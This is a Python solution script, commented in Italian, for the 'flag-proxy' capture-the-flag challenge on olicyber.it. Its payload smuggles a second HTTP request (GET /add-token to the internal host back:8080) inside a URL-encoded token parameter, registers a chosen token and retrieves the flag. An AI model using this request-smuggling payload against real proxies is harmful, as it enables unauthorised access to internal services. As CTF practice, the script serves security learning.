import requests
import urllib.parse
import os
import json

# il sito si apre su un Cannot GET /
# viene dato un file .zip 

url = "http://flag-proxy.challs.olicyber.it/"

# il file index.js gestisce un sistema di token per accedere alla flag
# chiede l'aggiunta di un token valido (endpoint /add-token?token=il_mio_token)
# se il token è lungo almeno 10 caratteri viene aggiunto alla lista di token validi
# endpoint /flag; inviare richiesta GET con header Authorization: Bearer il_mio_token
# se il token è valido viene restituita la flag

token = os.urandom(10).hex() # noi generiamo un token casuale della lunghezza giusta
payload = \
f'''{token}
Content-Length: 0
Connection: keep-alive

GET /add-token?token={token} HTTP/1.0
Host: back:8080
'''
# il payload simula una richiesta HTTP completa
requests.get(url + 'flag?token=' + urllib.parse.quote(payload))
r = requests.get(url + 'flag?token='+ token)
print(json.loads(r.text)['body'])